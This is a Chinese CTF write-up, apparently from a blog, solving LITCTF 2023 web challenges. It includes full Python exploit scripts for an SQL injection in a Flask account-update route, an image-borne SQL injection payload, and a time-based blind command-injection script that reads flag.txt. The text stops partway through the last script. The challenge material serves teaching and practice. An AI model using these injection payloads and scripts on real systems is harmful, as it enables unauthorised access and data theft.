/login&#x27;</span>&#125;)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>  <span class="hljs-keyword">with</span> sqlite3.connect(<span class="hljs-string">&#x27;database.db&#x27;</span>) <span class="hljs-keyword">as</span> con:<br>    cursor = con.cursor()<br>    data = request.form<br>    <span class="hljs-keyword">try</span>:<br>      username = data[<span class="hljs-string">&#x27;username&#x27;</span>]<br>      password = data[<span class="hljs-string">&#x27;password&#x27;</span>]<br>      cursor.execute(<span class="hljs-string">&#x27;SELECT * FROM users WHERE username=? AND password=?&#x27;</span>, (username, password))<br>      user = cursor.fetchone()<br>      <span class="hljs-keyword">if</span> user:<br>        randomToken = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(string.ascii_uppercase + string.digits) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>))<br>        <span class="hljs-keyword">while</span> randomToken <span class="hljs-keyword">in</span> sessions:<br>          randomToken = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(string.ascii_uppercase + string.digits) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>))<br>        sessions.append(&#123;<span class="hljs-string">&#x27;username&#x27;</span>: username, <span class="hljs-string">&#x27;token&#x27;</span>: randomToken&#125;)<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Login successful! You can find your account information at /account. Make sure to provide your token! You should know how to bear your Authorization...&#x27;</span>, <span class="hljs-string">&#x27;token&#x27;</span>: randomToken&#125;)<br>      <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Login failed!&#x27;</span>&#125;)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>      <span class="hljs-built_in">print</span>(e)<br>      <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Please provide your username and password as form-data or x-www-form-urlencoded!&#x27;</span>&#125;)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/account&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">account</span>():<br>  <span class="hljs-keyword">with</span> sqlite3.connect(<span class="hljs-string">&#x27;database.db&#x27;</span>) <span class="hljs-keyword">as</span> con:<br>    cursor = con.cursor()<br>    token = request.headers.get(<span class="hljs-string">&#x27;Authorization&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>)<br>    token = token.replace(<span class="hljs-string">&#x27;Bearer &#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> token:<br>      <span class="hljs-keyword">for</span> session <span class="hljs-keyword">in</span> sessions:<br>        <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;token&#x27;</span>] == token:<br>          cursor.execute(<span class="hljs-string">&#x27;SELECT * FROM users WHERE username=?&#x27;</span>, (session[<span class="hljs-string">&#x27;username&#x27;</span>],))<br>          user = cursor.fetchone()<br>          <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Here is your account information! You can update your account at /account/update. The flag can also be found at /flag. You need to be sus to get access tho...&#x27;</span>, <span class="hljs-string">&#x27;username&#x27;</span>: user[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;sus&#x27;</span>: user[<span class="hljs-number">3</span>], <span class="hljs-string">&quot;password&quot;</span>: user[<span class="hljs-number">2</span>]&#125;)<br>      <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Invalid token!&#x27;</span>&#125;)<br>    <span class="hljs-keyword">else</span>:<br>      <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Please provide your token!&#x27;</span>&#125;)<br>    <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/account/update&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update</span>():<br>  <span class="hljs-keyword">with</span> sqlite3.connect(<span class="hljs-string">&#x27;database.db&#x27;</span>) <span class="hljs-keyword">as</span> con:<br>    cursor = con.cursor()<br>    token = request.headers.get(<span class="hljs-string">&#x27;Authorization&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>)<br>    token = token.replace(<span class="hljs-string">&#x27;Bearer &#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> token:<br>      <span class="hljs-keyword">for</span> session <span class="hljs-keyword">in</span> sessions:<br>        <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;token&#x27;</span>] == token:<br>          data = request.form<br>          username = data[<span class="hljs-string">&#x27;username&#x27;</span>]<br>          password = data[<span class="hljs-string">&#x27;password&#x27;</span>]<br>          <span class="hljs-keyword">if</span> (username == <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> password == <span class="hljs-string">&#x27;&#x27;</span>):<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Please provide your new username and password as form-data or x-www-form-urlencoded!&#x27;</span>&#125;)<br>          cursor.execute(<span class="hljs-string">f&#x27;UPDATE users SET username=&quot;<span class="hljs-subst">&#123;username&#125;</span>&quot;, password=&quot;<span class="hljs-subst">&#123;password&#125;</span>&quot; WHERE username=&quot;<span class="hljs-subst">&#123;session[<span class="hljs-string">&quot;username&quot;</span>]&#125;</span>&quot;&#x27;</span>)<br>          con.commit()<br>          session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br>          <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Account updated!&#x27;</span>&#125;)<br>      <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Invalid token!&#x27;</span>&#125;)<br>    <span class="hljs-keyword">else</span>:<br>      <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Please provide your token!&#x27;</span>&#125;)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/flag&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>  <span class="hljs-keyword">with</span> sqlite3.connect(<span class="hljs-string">&#x27;database.db&#x27;</span>) <span class="hljs-keyword">as</span> con:<br>    cursor = con.cursor()<br>    token = request.headers.get(<span class="hljs-string">&#x27;Authorization&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>)<br>    token = token.replace(<span class="hljs-string">&#x27;Bearer &#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> token:<br>      <span class="hljs-keyword">for</span> session <span class="hljs-keyword">in</span> sessions:<br>        <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;token&#x27;</span>] == token:<br>          cursor.execute(<span class="hljs-string">&#x27;SELECT * FROM users WHERE username=?&#x27;</span>, (session[<span class="hljs-string">&#x27;username&#x27;</span>],))<br>          user = cursor.fetchone()<br>          <span class="hljs-keyword">if</span> user[<span class="hljs-number">3</span>]:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">f&#x27;Congrats! The flag is: flag<span class="hljs-subst">&#123;<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./flag.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read()&#125;</span>&#x27;</span>&#125;)<br>          <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;You need to be an sus to view the flag!&#x27;</span>&#125;)<br>      <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Invalid token!&#x27;</span>&#125;)<br>    <span class="hljs-keyword">else</span>:<br>      <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Please provide your token!&#x27;</span>&#125;)<br>    <br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>  app.debug = <span class="hljs-literal">True</span><br>  app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>)<br></code></pre></td></tr></table></figure><p>根据代码，先去访问一下&#x2F;signup</p><p><img src="/2023/08/09/Litctf2023/image-20230809174658290.png"></p><p>一开始没反应过来，看了一眼路由设置：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/signup&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br></code></pre></td></tr></table></figure><p>哦吼，只能POST传参啊，那不管是用hackbar还是bp抓包，或者在浏览器里进行请求，浏览器都会通过GET请求来获取页面内容。那想要只发送post请求，我想到了编写python脚本：</p><p>导入requests模块，定义5个url</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url1 = <span class="hljs-string">&#x27;http://litctf.org:31783/signup&#x27;</span><br>url2 = <span class="hljs-string">&#x27;http://litctf.org:31783/login&#x27;</span><br>url3 = <span class="hljs-string">&#x27;http://litctf.org:31783/account&#x27;</span><br>url4 = <span class="hljs-string">&#x27;http://litctf.org:31783/account/update&#x27;</span><br>url5 = <span class="hljs-string">&#x27;http://litctf.org:31783/flag&#x27;</span><br></code></pre></td></tr></table></figure><p>&#x2F;路由内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>  <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Welcome to the amogsus API! I\&#x27;ve been working super hard on it in the past few weeks. You can use a tool like postman to test it out. Start by signing up at /signup. Also, I think I might have forgotten to sanatize an input somewhere... Good luck!&#x27;</span>&#125;)<br></code></pre></td></tr></table></figure><p>&#x2F;signup路由：</p><p><img src="/2023/08/09/Litctf2023/image-20230809180652535.png"></p><p>这里就是输入用户名和密码注册一个新账户，因为sql语句进行了预编译处理，所以在这里作为突破点不太现实，脚本部分：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">username = <span class="hljs-string">&#x27;potatowo2&#x27;</span><br>password = <span class="hljs-string">&#x27;123&#x27;</span><br><br>r1 = requests.post(url1,data=&#123;<span class="hljs-string">&#x27;username&#x27;</span>:username,<br><span class="hljs-string">&#x27;password&#x27;</span>:password<br>&#125;).text<br><span class="hljs-built_in">print</span>(r1)<br></code></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;User created! You can now login at /login&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>再看&#x2F;login路由：</p><p><img src="/2023/08/09/Litctf2023/image-20230809181048124.png"></p><p>是一个后台生成登录后生成token并存入session的过程，sql语句依旧是使用了预编译，对应脚本内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">r2 = requests.post(url2,data=&#123;<span class="hljs-string">&#x27;username&#x27;</span>:username,<br><span class="hljs-string">&#x27;password&#x27;</span>:password<br>&#125;)<br>r2json = r2.json()<br><span class="hljs-built_in">print</span>(r2json)<br></code></pre></td></tr></table></figure><p>这里的json步骤是必要的，如果使用.text获取请求内容，是字符串而不是json，后续操作获取token起来会出问题</p><p>返回内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>&#x27;message&#x27;<span class="hljs-punctuation">:</span> &#x27;Login successful! You can find your account information at /account. Make sure to provide your token! You should know how to bear your Authorization...&#x27;<span class="hljs-punctuation">,</span> &#x27;token&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">6</span>WL12DAQ71INQ0AA3CNYKVIG7ND7GF2OT0U0U9VA&#x27;<span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>接着审计&#x2F;account：</p><p><img src="/2023/08/09/Litctf2023/image-20230809181833353.png"></p><p>这里服务端获取请求头中的Authorization，并且将其中的’Bearer ‘替换为空字符串，session中的token与上一步返回json中token值相同，因为去掉’Bearer ‘后要和那个token进行比较相同，所以构造header时在token前加上该字符串，还是预编译sql语句，对应脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">token = r2json[<span class="hljs-string">&#x27;token&#x27;</span>]<br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0&#x27;</span>,<br>    <span class="hljs-string">&#x27;Authorization&#x27;</span>: <span class="hljs-string">f&#x27;Bearer <span class="hljs-subst">&#123;token&#125;</span>&#x27;</span><br>&#125;<br><br>r3 = requests.get(url3,headers = headers).text<br><span class="hljs-built_in">print</span>(r3)<br></code></pre></td></tr></table></figure><p>返回内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Here is your account information! You can update your account at /account/update. The flag can also be found at /flag. You need to be sus to get access tho...&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;123&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;sus&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;potatowo233&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>接着看&#x2F;flag：</p><p><img src="/2023/08/09/Litctf2023/image-20230809183800702.png"></p><p>获取flag的条件：</p><p>和上一步一样的请求头处理，然后遍历所有的session，如果该sesssion对应的token与用户传入的相同，则在数据库中查询对应用户名的用户信息，如果查询结果的user[3]值为真，则输出flag。这里user[3]是什么呢？</p><p>在&#x2F;account代码中：</p><p><img src="/2023/08/09/Litctf2023/image-20230809184220882.png"></p><p>但是这个sus变量从程序的开始(&#x2F;signup)就被赋值为false了啊：</p><p><img src="/2023/08/09/Litctf2023/image-20230809184333497.png"></p><p>不急，继续往下看&#x2F;account&#x2F;update的代码：</p><p><img src="/2023/08/09/Litctf2023/image-20230809184454777.png"></p><p>还是拿着刚刚的header去访问，然后更新此时会话对应的用户密码，与之前不同的是，这里的sql语句没有进行预编译，而且没有任何过滤，这不是纯纯的SQL注入了吗，思路非常明确，我们要获得flag，就得使sus为True，但是sus从一开始就被定下来了，所以只能通过sql注入来更新sus的值了，更新完之后，去访问&#x2F;flag即可，对应脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">password = <span class="hljs-string">f&#x27;&#x27;&#x27;111&quot;,sus = &#x27;True&#x27; where username = &quot;<span class="hljs-subst">&#123;username&#125;</span>&quot; --&#x27;&#x27;&#x27;</span><br><span class="hljs-built_in">print</span>(password)<br>r4 = requests.post(url4,data=&#123;<span class="hljs-string">&#x27;username&#x27;</span>:username,<br><span class="hljs-string">&#x27;password&#x27;</span>:password<br>&#125;,headers = headers).text<br><span class="hljs-built_in">print</span>(r4)<br><br>r5 = requests.get(url5,headers = headers).text<br><span class="hljs-built_in">print</span>(r5)<br></code></pre></td></tr></table></figure><p>返回内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Account updated!&quot;</span><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Congrats! The flag is: flagLITCTF&#123;1njeC7_Th3_sUs_Am0ng_U5&#125;&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>一整个脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url1 = <span class="hljs-string">&#x27;http://litctf.org:31783/signup&#x27;</span><br>url2 = <span class="hljs-string">&#x27;http://litctf.org:31783/login&#x27;</span><br>url3 = <span class="hljs-string">&#x27;http://litctf.org:31783/account&#x27;</span><br>url4 = <span class="hljs-string">&#x27;http://litctf.org:31783/account/update&#x27;</span><br>url5 = <span class="hljs-string">&#x27;http://litctf.org:31783/flag&#x27;</span><br><br>params = &#123;&#125;<br><br>username = <span class="hljs-string">&#x27;potatowo233&#x27;</span><br>password = <span class="hljs-string">&#x27;123&#x27;</span><br><br>r1 = requests.post(url1,data=&#123;<span class="hljs-string">&#x27;username&#x27;</span>:username,<br><span class="hljs-string">&#x27;password&#x27;</span>:password<br>&#125;).text<br><span class="hljs-built_in">print</span>(r1)<br><br>r2 = requests.post(url2,data=&#123;<span class="hljs-string">&#x27;username&#x27;</span>:username,<br><span class="hljs-string">&#x27;password&#x27;</span>:password<br>&#125;)<br>r2json = r2.json()<br><span class="hljs-built_in">print</span>(r2json)<br><br>token = r2json[<span class="hljs-string">&#x27;token&#x27;</span>]<br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0&#x27;</span>,<br>    <span class="hljs-string">&#x27;Authorization&#x27;</span>: <span class="hljs-string">f&#x27;Bearer <span class="hljs-subst">&#123;token&#125;</span>&#x27;</span><br>&#125;<br><br>r3 = requests.get(url3,headers = headers).text<br><span class="hljs-built_in">print</span>(r3)<br><br>password = <span class="hljs-string">f&#x27;&#x27;&#x27;111&quot;,sus = &#x27;True&#x27; where username = &quot;<span class="hljs-subst">&#123;username&#125;</span>&quot; --&#x27;&#x27;&#x27;</span><br><span class="hljs-built_in">print</span>(password)<br>r4 = requests.post(url4,data=&#123;<span class="hljs-string">&#x27;username&#x27;</span>:username,<br><span class="hljs-string">&#x27;password&#x27;</span>:password<br>&#125;,headers = headers).text<br><span class="hljs-built_in">print</span>(r4)<br><br>r5 = requests.get(url5,headers = headers).text<br><span class="hljs-built_in">print</span>(r5)<br></code></pre></td></tr></table></figure><h3 id="license-inject"><a href="#license-inject" class="headerlink" title="license-inject"></a>license-inject</h3><p>上传一个图片然后获取图片上的文字，再返回文字的查询结果，这里审计源代码时运气非常好，顺着src&#x2F;routes&#x2F;api，对图片内容的识别肯定是调用外部接口的，那就审计这里面的代码。</p><p>注意到这里有一个查询语句：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">db.<span class="hljs-title function_">get</span>(<span class="hljs-string">`SELECT * FROM plates WHERE plate = &quot;<span class="hljs-subst">$&#123;text&#125;</span>&quot;`</span>, <span class="hljs-function">(<span class="hljs-params">err, row</span>)=&gt;</span>&#123;....&#125;)<br></code></pre></td></tr></table></figure><p>这不是很容易一下子就联想到是把api传回的数据进行查询然后返回信息吗，继续看看</p><p>这里定义了两个plates：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js">plates.<span class="hljs-title function_">push</span>(&#123;<br><span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;codetiger&#x27;</span>,<br><span class="hljs-comment">// very long random string</span><br><span class="hljs-attr">plate</span>: <span class="hljs-title class_">Array</span>(<span class="hljs-number">40</span>)<br>.<span class="hljs-title function_">fill</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br>.<span class="hljs-title function_">map</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>[<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">36</span>)])<br>.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&#x27;</span>),<br><span class="hljs-attr">fine</span>: <span class="hljs-string">&#x27;LITCTF&#123;redacted&#125;&#x27;</span><br>&#125;);<br>plates.<span class="hljs-title function_">push</span>(&#123;<br><span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Sample User&#x27;</span>,<br><span class="hljs-attr">plate</span>: <span class="hljs-string">&#x27;215BG2&#x27;</span>,<br><span class="hljs-attr">fine</span>: <span class="hljs-string">&#x27;$6942&#x27;</span><br>);<br></code></pre></td></tr></table></figure><p>结合查询语句和图片的信息，只需要闭合原引号，然后查询name&#x3D;’codetiger’，就可以传回codetiger的信息了，自然也就输出flag了</p><p>payload语句：<code>&quot; or name = &#39;codetiger&#39;;--</code>，</p><p>剩下的工作就是把这几个字搞成图片了，ps里输入文本，各种改字体，各种截图都失败了，理论上没问题啊，是不是还有图片的尺寸之类的校验，然后就把范例图片拿去ps改，还是不行。最后，解决方案是，在Typra里输入payload，然后截图一下就没了。。。</p><p><img src="/2023/08/09/Litctf2023/payload.png"></p><h3 id="Ping-Pong-Under-Maintenance"><a href="#Ping-Pong-Under-Maintenance" class="headerlink" title="Ping Pong: Under Maintenance"></a>Ping Pong: Under Maintenance</h3><p>看了眼代码，和上题tiger，差在了无法把执行内容直接输出，意思就是说环境在维修中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, redirect, request<br><span class="hljs-keyword">import</span> os<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    output = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        hostname = request.form[<span class="hljs-string">&#x27;hostname&#x27;</span>]<br>        cmd = <span class="hljs-string">&quot;ping -c 3 &quot;</span> + hostname<br>        output = os.popen(cmd).read()<br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, output=<span class="hljs-string">&#x27;The service is currently under maintainence and we have disabled outbound connections as a result.&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>虽然无法显示，但是还是存在命令执行的，那就尝试盲注</p><p>命令拼接过程中，先是试了下<code>|nc ip</code>，发现没法，应该靶机上没装nc，那就试试curl，居然也不行？？然后有点迷惑，我直接ping服务器还不行吗？服务器上tshark开启抓包，只抓icmp协议的，结果也没抓到任何包？？</p><p><img src="/2023/08/09/Litctf2023/image-20230809215141372.png"></p><p>判断没出网，当时想到的是sh脚本语句，是类似于编程语言的存在逻辑if语句，因此可能存在类似于SQL中的盲注，去学习了下，Linux中存在sleep：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sleep</span> 10<span class="hljs-comment">#延迟十秒</span><br></code></pre></td></tr></table></figure><p>传入<code>|sleep 10</code>，网页肉眼可见出现延迟，配合if语句</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-keyword">if</span> [ ... ];<span class="hljs-keyword">then</span> &lt;cmd&gt;<br><span class="hljs-keyword">elif</span> [ ... ];<span class="hljs-keyword">then</span> &lt;cmd&gt;<br><span class="hljs-keyword">else</span> &lt;cmd&gt;<br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>结合管道符和cut语句：</p><p>最终构造脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> string<br><br>url = <span class="hljs-string">&#x27;http://34.130.180.82:56409/&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><br>pre = string.ascii_uppercase + <span class="hljs-string">&#x27;234567=&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">200</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> pre:<br>        s_time = time.time()<br>        payload = <span class="hljs-string">f&#x27;&#x27;&#x27;|if [ `cat flag.txt|base32|cut -c <span class="hljs-subst">&#123;i&#125;</span>` = &#x27;<span class="hljs-subst">&#123;j&#125;</span>&#x27; ];then sleep 